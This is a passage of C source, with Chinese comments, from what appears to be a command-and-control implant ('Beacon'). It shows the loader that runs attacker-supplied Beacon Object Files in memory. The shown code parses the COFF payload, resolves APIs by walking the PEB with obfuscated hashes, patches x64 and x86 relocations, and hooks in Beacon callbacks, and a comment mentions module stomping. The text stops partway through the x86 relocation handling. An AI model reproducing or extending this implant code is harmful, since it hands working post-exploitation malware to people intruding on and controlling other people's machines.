#include "beacon_bof.h"

#include <stdarg.h>

/*
 * COFF/BOF 加载执行模块。
 * 每个 BOF Job 拥有独立 runtime，用于隔离 BSS 表、API 解析缓存、
 * 输出上下文、异常状态和取消事件；并发 BOF 不共享这些运行期字段。
 */

/* ===== BOF Job 运行时状态 ===== */

struct BofJobRuntime {
    BeaconContext* ctx;             /* 关联的 Beacon 上下文 */
    BeaconJob* job;                 /* 关联的 Job */
    HANDLE stop_event;              /* 取消事件句柄 */
    HANDLE entry_thread;            /* BOF 入口线程句柄 */
    DWORD entry_thread_id;          /* BOF 入口线程 ID */
    volatile LONG entry_started;    /* 入口线程已启动标志 */
    volatile LONG entry_done;       /* 入口线程已完成标志 */
    CRITICAL_SECTION lock;          /* 保护线程句柄的锁 */

    DWORD bss_entry_count;          /* BSS 段符号计数 */
    DWORD bss_entry_capacity;       /* BSS 段偏移表容量 */
    BSSEntry* bss_entries;          /* BSS 段偏移表 */
    COFFAPIFUNC ldr_api[16];        /* 延迟初始化的 Ldr API 表 */
    CHAR last_error[256];           /* 当前 BOF 最后错误信息 */

    volatile LONG exception_seen;   /* BOF 入口异常标志 */
    DWORD exception_code;           /* BOF 入口异常代码 */
    PVOID exception_address;        /* BOF 入口异常地址 */

    PVOID image_base;               /* BOF 映射基址，用于返回地址反查 */
    SIZE_T image_size;              /* BOF 映射大小 */
    INT registered;                 /* 是否已加入活跃 BOF 注册表 */
    struct BofJobRuntime* next;     /* 活跃 BOF 注册表链表 */
};

static INIT_ONCE g_BofRuntimeInitOnce = INIT_ONCE_STATIC_INIT;
static CRITICAL_SECTION g_BofRuntimeLock;
static DWORD g_BofTlsIndex = TLS_OUT_OF_INDEXES;
static BofJobRuntime* g_BofRuntimeList = NULL;

#if _WIN64
typedef BOOLEAN(WINAPI* BofRtlAddFunctionTable)(PRUNTIME_FUNCTION function_table,
                                                DWORD entry_count,
                                                DWORD64 base_address);
typedef BOOLEAN(WINAPI* BofRtlDeleteFunctionTable)(PRUNTIME_FUNCTION function_table);
#endif

/* ===== BOF runtime 注册表 / 动态 TLS ===== */

static BOOL CALLBACK BofRuntimeInitOnce(PINIT_ONCE init_once, PVOID parameter, PVOID* context)
{
    (VOID)init_once;
    (VOID)parameter;
    (VOID)context;

    InitializeCriticalSection(&g_BofRuntimeLock);
    g_BofTlsIndex = TlsAlloc();

    return g_BofTlsIndex != TLS_OUT_OF_INDEXES;
}

static BOOL BofRuntimeEnsureInit(VOID)
{
    return InitOnceExecuteOnce(&g_BofRuntimeInitOnce, BofRuntimeInitOnce, NULL, NULL);
}

static VOID BofRuntimeSetCurrent(BofJobRuntime* runtime)
{
    if (BofRuntimeEnsureInit()) {
        TlsSetValue(g_BofTlsIndex, runtime);
    }
}

static VOID BofRuntimeRegister(BofJobRuntime* runtime, PVOID image_base, SIZE_T image_size)
{
    if (!runtime || !image_base || image_size == 0 || !BofRuntimeEnsureInit()) return;

    EnterCriticalSection(&g_BofRuntimeLock);
    runtime->image_base = image_base;
    runtime->image_size = image_size;
    runtime->next = g_BofRuntimeList;
    g_BofRuntimeList = runtime;
    runtime->registered = 1;
    LeaveCriticalSection(&g_BofRuntimeLock);
}

static VOID BofRuntimeUnregister(BofJobRuntime* runtime)
{
    BofJobRuntime** pp;

    if (!runtime || !runtime->registered || !BofRuntimeEnsureInit()) return;

    EnterCriticalSection(&g_BofRuntimeLock);
    pp = &g_BofRuntimeList;
    while (*pp) {
        if (*pp == runtime) {
            *pp = runtime->next;
            break;
        }
        pp = &(*pp)->next;
    }
    runtime->next = NULL;
    runtime->registered = 0;
    LeaveCriticalSection(&g_BofRuntimeLock);
}

BofJobRuntime* BofGetCurrentRuntime(PVOID return_address)
{
    BofJobRuntime* runtime = NULL;
    ULONG_PTR addr = (ULONG_PTR)return_address;

    if (!BofRuntimeEnsureInit()) return NULL;

    /* 首选动态 TLS：BOF 入口线程由加载器创建时会写入当前 runtime。 */
    runtime = (BofJobRuntime*)TlsGetValue(g_BofTlsIndex);
    if (runtime) return runtime;

    if (!return_address) return NULL;

    /*
     * fallback：部分 BOF 可能自己创建线程，TLS 不一定被继承。
     * 此时用调用 Beacon API 的返回地址反查其所属 BOF 映射区间。
     */
    EnterCriticalSection(&g_BofRuntimeLock);
    for (runtime = g_BofRuntimeList; runtime; runtime = runtime->next) {
        ULONG_PTR base = (ULONG_PTR)runtime->image_base;
        ULONG_PTR end = base + runtime->image_size;
        if (addr >= base && addr < end) {
            break;
        }
    }
    LeaveCriticalSection(&g_BofRuntimeLock);

    return runtime;
}

BeaconContext* BofRuntimeGetContext(BofJobRuntime* runtime)
{
    return runtime ? runtime->ctx : NULL;
}

UINT32 BofRuntimeGetTaskId(BofJobRuntime* runtime)
{
    return runtime && runtime->job ? runtime->job->task_id : 0;
}

HANDLE BofRuntimeGetStopEvent(BofJobRuntime* runtime)
{
    return runtime ? runtime->stop_event : NULL;
}

/* ===== LdrApi 延迟初始化 ===== */

/* 在执行 BOF 前填充 LdrApi 表，从 ctx->api 获取函数指针 */
static VOID BofInitLdrApi(BofJobRuntime* runtime, BeaconContext* ctx)
{
    if (!runtime || !ctx) return;

    runtime->ldr_api[0].NameHash = TOWIDECHAR_HASH;
    runtime->ldr_api[0].Pointer  = (PVOID)toWideChar;
    runtime->ldr_api[1].NameHash = LOADLIBRARYA_HASH;
    runtime->ldr_api[1].Pointer  = (PVOID)ctx->api.pfnLoadLibraryA;
    runtime->ldr_api[2].NameHash = GETPROCADDRESS_HASH;
    runtime->ldr_api[2].Pointer  = (PVOID)ctx->api.pfnGetProcAddress;
    runtime->ldr_api[3].NameHash = FREELIBRARY_HASH;
    runtime->ldr_api[3].Pointer  = (PVOID)ctx->api.pfnFreeLibrary;
    runtime->ldr_api[4].NameHash = GETMODULEHANDLEA_HASH;
    runtime->ldr_api[4].Pointer  = (PVOID)ctx->api.pfnGetModuleHandleA;
    runtime->ldr_api[5].NameHash = 0;
    runtime->ldr_api[5].Pointer  = NULL;
}

/* 设置 BOF 最后错误信息（printf 风格） */
static VOID BofSetError(BofJobRuntime* runtime, const CHAR* fmt, ...)
{
    va_list ap;

    if (!runtime || !fmt) return;

    va_start(ap, fmt);
    vsnprintf(runtime->last_error, sizeof(runtime->last_error), fmt, ap);
    va_end(ap);

    runtime->last_error[sizeof(runtime->last_error) - 1] = '\0';
}

/* ===== 内部辅助函数 ===== */

/* FNV-1a 变体哈希（用于 COFF 符号匹配） */
static DWORD BofHashString(const CHAR* str, ULONG len, BOOL upper)
{
    DWORD hash = 0x811C9DC5u ^ 0x5A17B3C9u;
    ULONG i;

    if (!str || len == 0) return 0;

    for (i = 0; i < len && str[i]; i++) {
        BYTE ch = (BYTE)str[i];

        /* 大小写不敏感模式：小写转大写 */
        if (upper && ch >= 'a' && ch <= 'z') {
            ch = ch - 'a' + 'A';
        }

        hash ^= ch;
        hash *= 0x01000193u;
        hash = (hash >> 13) | (hash << 19);
    }

    /* 最终混淆 */
    hash ^= hash >> 16;
    hash *= 0x7FEB352Du;
    hash ^= hash >> 15;

    return hash;
}

/* 计算字符串长度（NULL 安全） */
static SIZE_T BofStrLen(const CHAR* s)
{
    const CHAR* p = s;

    if (!s) return 0;
    while (*p) p++;

    return (SIZE_T)(p - s);
}

/* 简化版 strtok（不可重入，仅供内部使用） */
static PCHAR BofStrToken(PCHAR str, const PCHAR delim)
{
    PCHAR spanp, token;
    INT c, sc;
    PCHAR s;

    if (!str) return NULL;
    s = str;

CONTINUE:
    c = *s++;
    for (spanp = delim; (sc = *spanp++) != 0;) {
        if (c == sc) goto CONTINUE;
    }
    if (c == 0) return NULL;

    token = s - 1;

    for (;;) {
        c = *s++;
        spanp = delim;
        do {
            if ((sc = *spanp++) == c) {
                if (c == 0) s = NULL;
                else s[-1] = '\0';
                return token;
            }
        } while (sc != 0);
    }

    return NULL;
}

/* 跳过导入 thunk 前导下划线（x86 的 _ 前缀） */
static PCHAR BofSkipImportThunkPrefix(PCHAR name)
{
    if (!name) return NULL;
    while (*name == '_') name++;
    return name;
}

/* 获取 __imp_ 或 __imp__ 前缀的长度 */
static DWORD BofGetImportPrefixSize(PCHAR name)
{
    if (!name) return 0;

    /* 检查 __imp__（x86） */
    if (BofHashString(name, COFF_PREP_SYMBOL_SIZE + 1, FALSE) ==
        BofHashString("__imp__", COFF_PREP_SYMBOL_SIZE + 1, FALSE))
        return COFF_PREP_SYMBOL_SIZE + 1;

    /* 检查 __imp_（x64） */
    if (BofHashString(name, COFF_PREP_SYMBOL_SIZE, FALSE) == COFF_PREP_SYMBOL)
        return COFF_PREP_SYMBOL_SIZE;

    return 0;
}

/* 获取 __imp_Beacon 或 __imp__Beacon 前缀的长度 */
static DWORD BofGetBeaconPrefixSize(PCHAR name)
{
    DWORD ips = BofGetImportPrefixSize(name);

    if (!ips) return 0;

    if (BofHashString(name, ips + 6, FALSE) ==
        BofHashString(ips == COFF_PREP_SYMBOL_SIZE ? "__imp_Beacon" : "__imp__Beacon",
                     ips + 6, FALSE))
        return ips + 6;

    return 0;
}

/* 去除 stdcall 后缀（如 FuncName@8 → FuncName） */
static VOID BofStripStdcallSuffix(PCHAR name)
{
    DWORD i;

    if (!name) return;

    for (i = 0; name[i] != '\0'; i++) {
        if (name[i] == '@') {
            name[i] = '\0';
            return;
        }
    }
}

/* 安全复制字符串 */
static BOOL BofCopyString(PCHAR dst, SIZE_T dstSize, const CHAR* src)
{
    SIZE_T len;

    if (!dst || dstSize == 0 || !src) return FALSE;

    len = BofStrLen(src);
    if (len >= dstSize) return FALSE;

    memcpy(dst, src, len);
    dst[len] = '\0';

    return TRUE;
}

/* 如果缺少 .dll 后缀则自动追加 */
static BOOL BofAppendDllSuffix(PCHAR dst, SIZE_T dstSize)
{
    SIZE_T len;

    if (!dst || dstSize == 0) return FALSE;

    /* 已有扩展名则跳过 */
    if (strchr(dst, '.')) return TRUE;

    len = BofStrLen(dst);
    if (len + 4 >= dstSize) return FALSE;

    memcpy(dst + len, ".dll", 5);

    return TRUE;
}

/* 从指定 DLL 解析导出函数地址 */
static BOOL BofResolveDllProc(BofJobRuntime* runtime, PCHAR moduleName, PCHAR procName, PVOID* procAddr)
{
    CHAR dllName[128] = { 0 };
    ANSI_STRING ansiStr = { 0 };
    BeaconContext* ctx;
    HMODULE hModule;

    if (!runtime || !moduleName || !procName || !procAddr) return FALSE;
    ctx = runtime->ctx;
    if (!ctx) return FALSE;
    *procAddr = NULL;

    /* 规范化 DLL 名称（追加 .dll 后缀） */
    if (!BofCopyString(dllName, sizeof(dllName), moduleName) ||
        !BofAppendDllSuffix(dllName, sizeof(dllName))) {
        return FALSE;
    }

    /* 先从 PEB 已加载模块查找 */
    hModule = GetModuleByPeb(BofHashString(dllName, (ULONG)BofStrLen(dllName), TRUE));

    /* 未找到则尝试 LoadLibraryA */
    if (!hModule && ctx->api.pfnLoadLibraryA) {
        hModule = ctx->api.pfnLoadLibraryA(dllName);
    }
    if (!hModule) return FALSE;

    /* 优先使用 LdrGetProcedureAddress（NT API） */
    if (ctx->api.pfnLdrGetProcedureAddress) {
        ansiStr.Length        = (USHORT)BofStrLen(procName);
        ansiStr.MaximumLength = ansiStr.Length + sizeof(CHAR);
        ansiStr.Buffer        = procName;

        if (ctx->api.pfnLdrGetProcedureAddress(hModule, &ansiStr, 0, procAddr) == 0 &&
            *procAddr != NULL) {
            return TRUE;
        }
    }

    /* 回退到 GetProcAddress */
    if (ctx->api.pfnGetProcAddress) {
        *procAddr = (PVOID)ctx->api.pfnGetProcAddress(hModule, procName);
    }

    return *procAddr != NULL;
}

/* 在常见系统 DLL 中查找导出函数 */
static BOOL BofResolveCommonProc(BofJobRuntime* runtime, PCHAR procName, PVOID* procAddr)
{
    static CHAR* modules[] = {
        "kernel32.dll",
        "kernelbase.dll",
        "user32.dll",
        "advapi32.dll",
        "msvcrt.dll",
        "ntdll.dll",
        NULL
    };

    for (DWORD i = 0; modules[i]; i++) {
        if (BofResolveDllProc(runtime, modules[i], procName, procAddr)) {
            return TRUE;
        }
    }

    return FALSE;
}

/* ===== BOF Payload 解析（Go Beacon 格式） ===== */

/*
 * 解析 BOF 命令 payload
 * 格式: [4B coffLen][coffBytes][4B argsLen][argsBytes]
 * 入口点名称未在 payload 中传递，按约定默认 "go" / "_go"
 */
static BOOL BofParsePayload(Parser* p, PCHAR entryName, SIZE_T entryNameSize,
                            PVOID* bofData, PDWORD bofSize,
                            PVOID* argsData, PDWORD argsSize)
{
    ByteBuf coffBytes;
    ByteBuf argBytes;

    if (!p || !bofData || !bofSize) return FALSE;

    /* 读取 COFF 文件数据 */
    coffBytes = ParserBytes(p);
    if (!coffBytes.data || coffBytes.len == 0) return FALSE;

    *bofData = coffBytes.data;
    *bofSize = (DWORD)coffBytes.len;

    /* 设置默认入口点名称 */
#ifdef _WIN64
    if (entryName[0] == '\0') {
        memcpy(entryName, "go", min(entryNameSize, 3));
    }
#else
    if (entryName[0] == '\0') {
        memcpy(entryName, "_go", min(entryNameSize, 4));
    }
#endif

    /* 读取参数（可选） */
    *argsData = NULL;
    *argsSize = 0;

    if (ParserLeft(p) > 0) {
        argBytes = ParserBytes(p);
        if (argBytes.data && argBytes.len > 0) {
            *argsData = argBytes.data;
            *argsSize = (DWORD)argBytes.len;
        }
    }

    return TRUE;
}

/* 验证 COFF 文件头的完整性和合法性 */
static BOOL BofValidateCoff(PCOFFEE pCoffee, DWORD dwBofSize, PCHAR reason, SIZE_T reasonSize)
{
    SIZE_T sectionTableEnd;
    SIZE_T symbolTableEnd;

    if (!pCoffee || !pCoffee->Header || dwBofSize < sizeof(COFF_FILE_HEADER)) {
        snprintf(reason, reasonSize, "file too small");
        return FALSE;
    }

    /* 验证节区表不越界 */
    sectionTableEnd = sizeof(COFF_FILE_HEADER) +
        ((SIZE_T)pCoffee->Header->NumberOfSections * sizeof(COFF_SECTION));
    if (pCoffee->Header->NumberOfSections == 0 || sectionTableEnd > dwBofSize) {
        snprintf(reason, reasonSize, "invalid section table");
        return FALSE;
    }

    /* 验证符号表偏移不越界 */
    if (pCoffee->Header->PointerToSymbolTable >= dwBofSize) {
        snprintf(reason, reasonSize, "invalid symbol table offset");
        return FALSE;
    }

    /* 验证符号表大小不越界 */
    symbolTableEnd = (SIZE_T)pCoffee->Header->PointerToSymbolTable +
        ((SIZE_T)pCoffee->Header->NumberOfSymbols * sizeof(COFF_SYMBOL));
    if (symbolTableEnd > dwBofSize) {
        snprintf(reason, reasonSize, "invalid symbol table size");
        return FALSE;
    }

    return TRUE;
}

/* ===== 模块践踏内存分配 ===== */

/*
 * 分配 BOF 映射内存。
 * 默认禁用 propsys.dll module stomping，避免 UI/凭据类 BOF 调用系统组件时踩坏依赖模块。
 */
static PVOID BofAllocateImageMemory(BeaconContext* ctx, DWORD dwSize)
{
    PVOID buffer = NULL;
    SIZE_T size = dwSize;

    if (!ctx || dwSize == 0 || !ctx->api.pfnNtAllocateVirtualMemory) {
        return NULL;
    }

    if (ctx->api.pfnNtAllocateVirtualMemory((HANDLE)-1, &buffer, 0, &size,
                                             MEM_COMMIT | MEM_RESERVE,
                                             PAGE_READWRITE) == 0) {
        return buffer;
    }

    return NULL;
}

/* ===== 计算 BOF 总大小 ===== */

/*
 * 遍历所有节区和重定位条目，计算：
 * - 所有节区的原始数据总大小（页对齐）
 * - GOT 表大小（外部函数跳转表）
 * - BSS 段大小（未初始化全局变量）
 */
static SIZE_T BofParseTotalSize(BofJobRuntime* runtime, PCOFFEE pCoffee,
                                SIZE_T* stTotalSize, PSIZE_T pstBSSSize)
{
    CHAR sym_name[9] = { 0 };
    PCHAR symbol_name = NULL;
    DWORD number_of_func = 0;
    PCOFF_SYMBOL coff_symbol = NULL;
    DWORD sec, r;

    *stTotalSize = 0;
    *pstBSSSize = 0;
    runtime->bss_entry_count = 0;
    runtime->bss_entry_capacity = 0;

    for (sec = 0; sec < pCoffee->Header->NumberOfSections; sec++) {
        /* 定位当前节区头 */
        pCoffee->Section = (PCOFF_SECTION)((ULONG_PTR)pCoffee->Data +
            sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * sec));
        pCoffee->Reloc = (PCOFF_RELOC)((ULONG_PTR)pCoffee->Data +
            pCoffee->Section->PointerToRelocations);

        /* 累加节区大小（页对齐） */
        *stTotalSize += pCoffee->Section->SizeOfRawData;
        *stTotalSize = (SIZE_T)PAGE_ALLIGN(*stTotalSize);

        /* 遍历重定位条目，统计外部函数和 BSS 符号 */
        for (r = 0; r < pCoffee->Section->NumberOfRelocations; r++) {
            coff_symbol = &pCoffee->Symbol[pCoffee->Reloc->SymbolTableIndex];

            /* 获取符号名称 */
            if (coff_symbol->First.Value[0] != 0) {
                memset(sym_name, 0, sizeof(sym_name));
                memcpy(sym_name, coff_symbol->First.Name, 8);
                symbol_name = sym_name;
            } else {
                symbol_name = (PCHAR)((ULONG_PTR)(pCoffee->Symbol +
                    pCoffee->Header->NumberOfSymbols) + coff_symbol->First.Value[1]);
            }

            /* 外部符号且未分配节区：区分 __imp_ 前缀函数和 BSS 变量 */
            if (coff_symbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
                coff_symbol->SectionNumber == 0x0) {
                if (BofHashString(symbol_name, COFF_PREP_SYMBOL_SIZE, FALSE) == COFF_PREP_SYMBOL)
                    number_of_func++;   /* 外部导入函数 */
                else {
                    *pstBSSSize += coff_symbol->Value;  /* BSS 变量 */
                    runtime->bss_entry_count++;
                }
            }

            pCoffee->Reloc = (PCOFF_RELOC)((ULONG_PTR)pCoffee->Reloc + sizeof(COFF_RELOC));
        }
    }

    /* 总大小 = 节区数据 + GOT 表 + BSS + 4 字节标志位 */
    *stTotalSize += sizeof(PVOID) * number_of_func;
    *stTotalSize += *pstBSSSize;
    *stTotalSize += 0x4;
    runtime->bss_entry_capacity = runtime->bss_entry_count;

    return sizeof(PVOID) * number_of_func;
}

/* ===== 符号解析 ===== */

/*
 * 解析单个 COFF 符号，返回其内存地址
 * 三类符号：
 * 1. __imp_BeaconXxx → Beacon API 回调
 * 2. __imp_Lib$Func → DLL 导入函数
 * 3. 无前缀 → BSS 段变量
 */
static BOOL BofProcessSymbol(BofJobRuntime* runtime, PCHAR pSymbolName, PCOFF_SYMBOL pCoffSymbol,
                             PVOID* pvFunctionAddr, PDWORD pdwBssAddr)
{
    CHAR symbol_name[1024] = { 0 };
    CHAR import_name[1024] = { 0 };
    CHAR normalized_symbol[1024] = { 0 };
    CHAR normalized_library[1024] = { 0 };
    CHAR* libraryName = NULL;
    CHAR* functionName = NULL;
    CHAR* symbolName = NULL;
    DWORD import_prefix_size = 0;
    DWORD beacon_prefix_size = 0;

    import_prefix_size = BofGetImportPrefixSize(pSymbolName);
    beacon_prefix_size = BofGetBeaconPrefixSize(pSymbolName);

    /* 1. Beacon API 符号：__imp_BeaconXxx */
    if (beacon_prefix_size != 0) {
        symbolName = pSymbolName + import_prefix_size;
        symbolName = BofSkipImportThunkPrefix(symbolName);

        if (!BofCopyString(normalized_symbol, sizeof(normalized_symbol), symbolName)) {
            BofSetError(runtime, "Beacon API symbol name too long: %s", pSymbolName);
            return FALSE;
        }
        BofStripStdcallSuffix(normalized_symbol);

        /* 在 BeaconApi 符号表中查找哈希匹配 */
        for (DWORD i = 0; ; i++) {
            extern COFFAPIFUNC BeaconApi[];
            if (!BeaconApi[i].NameHash) break;
            if (BofHashString(normalized_symbol, (ULONG)BofStrLen(normalized_symbol), FALSE) ==
                BeaconApi[i].NameHash) {
                *pvFunctionAddr = BeaconApi[i].Pointer;
                return TRUE;
            }
        }

        BofSetError(runtime, "failed to resolve Beacon API symbol: %s", normalized_symbol);
        return FALSE;
    }

    /* 2. 通用导入符号：__imp_LIB$FUNC 或 __imp_FUNC */
    if (import_prefix_size != 0) {
        DWORD i;

        if (!BofCopyString(import_name, sizeof(import_name), pSymbolName)) {
            BofSetError(runtime, "import symbol name too long");
            return FALSE;
        }

        /* 检查是否包含 $ 分隔符 */
        for (i = 0; i < (DWORD)BofStrLen(pSymbolName); i++) {
            if (pSymbolName[i] == '$') break;
        }

        symbolName = import_name + import_prefix_size;
        symbolName = BofSkipImportThunkPrefix(symbolName);

        if (i < (DWORD)BofStrLen(pSymbolName)) {
            /* 格式：__imp_LIB$FUNC → 解析 DLL 和函数名 */
            libraryName = BofStrToken(symbolName, "$");
            functionName = libraryName + BofStrLen(libraryName) + 1;
            libraryName = BofSkipImportThunkPrefix(libraryName);

            if (!BofCopyString(normalized_library, sizeof(normalized_library), libraryName) ||
                !BofCopyString(symbol_name, sizeof(symbol_name), functionName)) {
                BofSetError(runtime, "import symbol component too long: %s", pSymbolName);
                return FALSE;
            }
            BofStripStdcallSuffix(symbol_name);

            if (BofResolveDllProc(runtime, normalized_library, symbol_name, pvFunctionAddr)) {
                return TRUE;
            }
            BofSetError(runtime, "failed to resolve import: %s$%s", normalized_library, symbol_name);
            return FALSE;
        } else {
            /* 格式：__imp_FUNC → 在 LdrApi 表或常见 DLL 中查找 */
            if (!BofCopyString(symbol_name, sizeof(symbol_name), symbolName)) {
                BofSetError(runtime, "import symbol name too long: %s", pSymbolName);
                return FALSE;
            }
            BofStripStdcallSuffix(symbol_name);

            /* 先查 LdrApi 延迟初始化表 */
            for (i = 0; ; i++) {
                if (!runtime->ldr_api[i].NameHash) break;
                if (BofHashString(symbol_name, (ULONG)BofStrLen(symbol_name), FALSE) ==
                    runtime->ldr_api[i].NameHash) {
                    *pvFunctionAddr = runtime->ldr_api[i].Pointer;
                    return TRUE;
                }
            }

            /* 再在常见系统 DLL 中查找 */
            if (BofResolveCommonProc(runtime, symbol_name, pvFunctionAddr)) {
                return TRUE;
            }

            BofSetError(runtime, "failed to resolve import: %s", symbol_name);
            return FALSE;
        }
    }

    /* 3. BSS 段符号（无 __imp_ 前缀） */
    if (import_prefix_size == 0 && beacon_prefix_size == 0) {
        DWORD sum = 0;

        for (DWORD i = 0; i < runtime->bss_entry_capacity; i++) {
            if (runtime->bss_entries[i].pvSymbolAddr == (PVOID)pCoffSymbol) {
                break;
            } else if (runtime->bss_entries[i].pvSymbolAddr == NULL && runtime->bss_entries[i].stOffset == 0) {
                runtime->bss_entries[i].stOffset = pCoffSymbol->Value;
                runtime->bss_entries[i].pvSymbolAddr = (PVOID)pCoffSymbol;
                break;
            } else {
                sum += (DWORD)runtime->bss_entries[i].stOffset;
            }
        }

        *pdwBssAddr = (ULONG_PTR)*pdwBssAddr + sum + 0x4;
        return TRUE;
    }

    return FALSE;
}

/* ===== 重定位处理 ===== */

/*
 * 处理所有节区的重定位条目
 * 支持 x64: REL32, REL32_1~5, ADDR32NB, ADDR64
 * 支持 x86: REL32, DIR32, DIR32NB, SECTION, SECREL
 */
static BOOL BofProcessSection(BeaconContext* ctx, BofJobRuntime* runtime, PCOFFEE pCoffee)
{
    CHAR sym_name[9] = { 0 };
    PCHAR symbol_name = NULL;
    PVOID function_ptr = NULL;
    DWORD number_of_func = 0;
    PVOID reloc_addr = NULL;
    PVOID func_map_addr = NULL;
    PVOID symbol_sec_addr = NULL;
    ULONG_PTR bss_addr = 0;
    PCOFF_SYMBOL coff_symbol = NULL;
    DWORD sec, r;

    for (sec = 0; sec < pCoffee->Header->NumberOfSections; sec++) {
        /* 定位当前节区 */
        pCoffee->Section = (PCOFF_SECTION)((ULONG_PTR)pCoffee->Data +
            sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * sec));
        pCoffee->Reloc = (PCOFF_RELOC)((ULONG_PTR)pCoffee->Data +
            pCoffee->Section->PointerToRelocations);

        for (r = 0; r < pCoffee->Section->NumberOfRelocations; r++) {
            DWORD bss_entry_offset = 0;

            /* 重置当前重定位状态 */
            function_ptr    = NULL;
            symbol_sec_addr = NULL;
            bss_addr        = 0;

            coff_symbol = &pCoffee->Symbol[pCoffee->Reloc->SymbolTableIndex];

            /* 获取符号名称 */
            if (coff_symbol->First.Value[0] != 0) {
                memset(sym_name, 0, sizeof(sym_name));
                memcpy(sym_name, coff_symbol->First.Name, 8);
                symbol_name = sym_name;
            } else {
                symbol_name = (PCHAR)((ULONG_PTR)pCoffee->Symbol +
                    pCoffee->Header->NumberOfSymbols * 0x12 +
                    (ULONG_PTR)coff_symbol->First.Value[1]);
            }

            /* 计算重定位目标地址和 GOT 槽位 */
            reloc_addr    = pCoffee->SecMap[sec].Ptr + pCoffee->Reloc->VirtualAddress;
            func_map_addr = &pCoffee->GOT[number_of_func];

            /* 获取符号所在节区的基址 */
            if (coff_symbol->SectionNumber > 0 &&
                coff_symbol->SectionNumber <= pCoffee->Header->NumberOfSections) {
                symbol_sec_addr = pCoffee->SecMap[coff_symbol->SectionNumber - 1].Ptr;
            }

            /* 解析外部符号 */
            if ((coff_symbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL) &&
                coff_symbol->SectionNumber == 0x0) {
                if (!BofProcessSymbol(runtime, symbol_name, coff_symbol, &function_ptr, &bss_entry_offset))
                    return FALSE;
                if (!function_ptr && bss_entry_offset)
                    bss_addr = (ULONG_PTR)pCoffee->BSS + bss_entry_offset;
            }

#if _WIN64
            /* ===== x64 重定位处理 ===== */
            {
                UINT64 OffsetLong = 0;
                UINT32 Offset = 0;

                if (pCoffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && function_ptr != NULL) {
                    /* 外部函数：写入 GOT 表项，计算 RIP 相对偏移 */
                    pCoffee->GOT[number_of_func] = (ULONG_PTR)function_ptr;
                    Offset = (UINT32)((ULONG_PTR)(&pCoffee->GOT[number_of_func]) -
                        (ULONG_PTR)(reloc_addr) - sizeof(UINT32));
                    *((PUINT32)reloc_addr) = Offset;
                    number_of_func++;

                } else if (pCoffee->Reloc->Type >= IMAGE_REL_AMD64_REL32 &&
                           pCoffee->Reloc->Type <= IMAGE_REL_AMD64_REL32_5) {
                    /* BSS/节区内符号：计算 REL32 变体偏移 */
                    if (bss_addr != 0) {
                        Offset = (UINT32)(bss_addr -
                            (ULONG_PTR)(pCoffee->Reloc->Type - 4) -
                            ((ULONG_PTR)reloc_addr + 4));
                    } else if ((coff_symbol->StorageClass == IMAGE_SYM_CLASS_STATIC &&
                                coff_symbol->Value != 0) ||
                               (coff_symbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
                                coff_symbol->SectionNumber != 0x0)) {
                        Offset = (UINT32)((ULONG_PTR)coff_symbol->Value +
                            (ULONG_PTR)(symbol_sec_addr) - (ULONG_PTR)(reloc_addr) -
                            sizeof(UINT32) - (ULONG_PTR)(pCoffee->Reloc->Type - 4));
                    } else {
                        Offset = (UINT32)((ULONG_PTR)*(PUINT32)(reloc_addr) +
                            (ULONG_PTR)(symbol_sec_addr) - (ULONG_PTR)(reloc_addr) -
                            sizeof(UINT32) - (ULONG_PTR)(pCoffee->Reloc->Type - 4));
                    }
                    *((PUINT32)reloc_addr) = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_AMD64_ADDR32NB) {
                    /* ImageBase 相对 32 位偏移，主要用于 x64 .pdata unwind 表。 */
                    if (bss_addr != 0) {
                        Offset = (UINT32)(bss_addr + *(PUINT32)reloc_addr -
                            (ULONG_PTR)pCoffee->ImageBase);
                    } else if (symbol_sec_addr != NULL) {
                        Offset = (UINT32)((ULONG_PTR)symbol_sec_addr +
                            (ULONG_PTR)coff_symbol->Value + *(PUINT32)reloc_addr -
                            (ULONG_PTR)pCoffee->ImageBase);
                    } else {
                        Offset = *(PUINT32)reloc_addr;
                    }
                    *((PUINT32)reloc_addr) = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_AMD64_ADDR64) {
                    /* 绝对 64 位地址 */
                    if (bss_addr != 0) {
                        OffsetLong = bss_addr + *(PUINT64)reloc_addr;
                    } else if (symbol_sec_addr != NULL) {
                        OffsetLong = (ULONG_PTR)symbol_sec_addr +
                            (ULONG_PTR)coff_symbol->Value + *(PUINT64)reloc_addr;
                    } else {
                        OffsetLong = *(PUINT64)reloc_addr;
                    }
                    *((PUINT64)reloc_addr) = OffsetLong;
                }
            }
#else
            /* ===== x86 重定位处理 ===== */
            {
                UINT32 Offset = 0;

                if (pCoffee->Reloc->Type == IMAGE_REL_I386_REL32 && function_ptr != NULL) {
                    /* 外部函数相对偏移 */
                    Offset = (UINT32)((ULONG_PTR)function_ptr -
                        ((ULONG_PTR)reloc_addr + sizeof(UINT32)));
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_REL32 && bss_addr != 0) {
                    /* BSS 相对偏移 */
                    Offset = (UINT32)(bss_addr - (ULONG_PTR)reloc_addr - sizeof(UINT32));
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_REL32 &&
                           ((coff_symbol->StorageClass == IMAGE_SYM_CLASS_STATIC &&
                             coff_symbol->Value != 0) ||
                            (coff_symbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
                             coff_symbol->SectionNumber != 0x0))) {
                    /* 节区内静态符号相对偏移 */
                    Offset = coff_symbol->Value;
                    Offset += (ULONG_PTR)symbol_sec_addr - (ULONG_PTR)reloc_addr - sizeof(UINT32);
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_REL32 &&
                           function_ptr == NULL && symbol_sec_addr != NULL) {
                    /* 节区内符号相对偏移 */
                    Offset = *(PUINT32)(reloc_addr);
                    Offset += (ULONG_PTR)symbol_sec_addr - (ULONG_PTR)reloc_addr - sizeof(UINT32);
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32 && function_ptr != NULL) {
